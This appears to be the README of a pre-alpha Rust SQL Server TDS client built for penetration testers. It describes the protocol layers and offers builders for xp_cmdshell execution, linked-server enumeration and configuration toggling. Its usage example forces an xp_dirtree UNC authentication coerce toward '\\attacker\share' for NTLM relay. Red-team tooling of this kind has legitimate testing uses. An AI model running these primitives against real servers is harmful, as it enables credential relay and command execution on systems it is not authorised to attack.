# ms-tds

[![Crates.io](https://img.shields.io/crates/v/ms-tds.svg)](https://crates.io/crates/ms-tds)
[![Docs.rs](https://docs.rs/ms-tds/badge.svg)](https://docs.rs/ms-tds)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

Pure-Rust **TDS 7.4** client for Microsoft SQL Server, with an
offensive-security lean: pentest primitives (`xp_cmdshell`, UNC coerce via
`xp_dirtree`, linked-server enumeration, `sp_configure` toggling,
`IS_SRVROLEMEMBER` checks) are shipped in-tree. Aimed at attack-tooling
authors who today rely on impacket's `mssqlclient.py` or PowerUpSQL.

## Status

**`0.1.0-dev`** — pre-alpha, expect breaking changes before `0.1.0`.
Compile-clean skeleton with a partial wire implementation; not fit for
anything beyond exploration. Part of the
[icedracon](https://github.com/icedracon) Rust offensive AD ecosystem.

## What it does

Implements enough of MS-TDS 7.4 (Tabular Data Stream) to reach and drive a
SQL Server login session:

- **Packet layer** — 8-byte BE header; `frame()` segments a payload across
  `packet_size`; `Transport::recv()` reassembles until `END_OF_MESSAGE`.
- **PreLogin** — encode / decode round-trip.
- **TLS-in-TDS handshake tunneling** — `TlsTunnel` wraps rustls handshake
  records inside TDS `PRELOGIN` packets and flips to passthrough afterwards,
  so a SQL Server with `Force Encryption = yes` accepts the login. TDS
  framing then rides on top of the TLS layer unchanged.
- **Login7** — full fixed header + OffsetLength block + variable data,
  including the NTLM SSPI blob in `ibSSPI` with `INTEGRATED_SECURITY` set.
  Password obfuscation (`XOR 0xA5` + nibble swap) implemented.
- **Token stream reader** — `LOGINACK`, `SSPI`, `ENVCHANGE`,
  `DONE` / `DONEPROC` / `DONEINPROC`, `INFO`, `ERROR`.
- **Async client** — `TdsClient::{connect, login_ntlm, sql_batch}` drives the
  handshake end-to-end on `tokio`.
- **Pentest string builders** — `pentest::{xp_cmdshell, xp_dirtree_unc,
  enum_linked_servers, is_srvrolemember, sp_configure_toggle}`.

## Usage

```rust,no_run
use ms_tds::{pentest, TdsClient};

# async fn go() -> ms_tds::Result<()> {
let mut c = TdsClient::connect("sql01", 1433, None).await?;
c.login_ntlm("CORP", "svc_scan", "hunter2").await?;

// Fire a SQLBatch. In 0.1.0-dev the DONE-token row count comes back;
// ROW / COLMETADATA decoding is not implemented yet, so the returned
// ResultSet is empty even when the server sent rows.
let rs = c.sql_batch(pentest::enum_linked_servers()).await?;
println!("row_count = {}", rs.row_count);

// Force a UNC coerce toward an attacker-controlled host (auth relay setup).
let _ = c.sql_batch(pentest::xp_dirtree_unc(r"\\attacker\share")).await?;
# Ok(()) }
```

## What works / what does not (this version)

- Working
  - Packet framing, PreLogin round-trip, TLS-in-TDS handshake tunneling.
  - Login7 encode + NTLM SSPI blob wrapping.
  - Async `connect` / `login_ntlm` / `sql_batch` — wire handshakes driven
    end-to-end.
  - DONE-token row-count reporting.
  - Pentest string builders.
- Stubbed / TODO
  - **ROW / COLMETADATA decoding** — `sql_batch` returns an empty
    `ResultSet` even when rows are sent. Needs the full TYPE_INFO matrix
    (variable-length prefixes, `COLLATION` for `VARCHAR`, precision/scale
    for `NUMERIC`, PLP for `varchar(max)` / `text` / `image`).
  - **SQL Browser (UDP 1434)** — named-instance resolution not implemented;
    `connect()` takes `instance: Option<&str>` for API stability but
    ignores it.
  - **Kerberos SPNEGO** — `login_ntlm` is NTLM-only.
  - **Channel binding / Extended Protection for Authentication** — outstanding.

## Design

- One thin module per protocol layer:
  `packet` -> `prelogin` / `login7` / `token` -> `transport` / `tls_tunnel` -> `client`.
- `#![deny(unsafe_code)]`.
- Dep budget kept small: `ntlmssp` (SSPI blobs), `tokio`, `tokio-rustls`
  (ring backend — no cmake/nasm on Windows), `thiserror`, `byteorder`,
  `bytes`, `encoding_rs`.

## Related icedracon crates

- [`msldap-ext`](https://github.com/icedracon/msldap-ext) — MS-ADTS LDAP
  extension controls (Paged / DirSync / ExtendedDN / SD_FLAGS / VLV).
- [`ms-even6`](https://github.com/icedracon/ms-even6) — MS-EVEN6 EventLog
  Remoting v6 client + BinXml decoder (remote log pulls over `\pipe\eventlog`).

Together the three cover the LDAP / EventLog / MSSQL data-plane primitives
that Python + impacket dominate today.

## License

MIT (c) 2026 [zevs](https://github.com/icedracon)
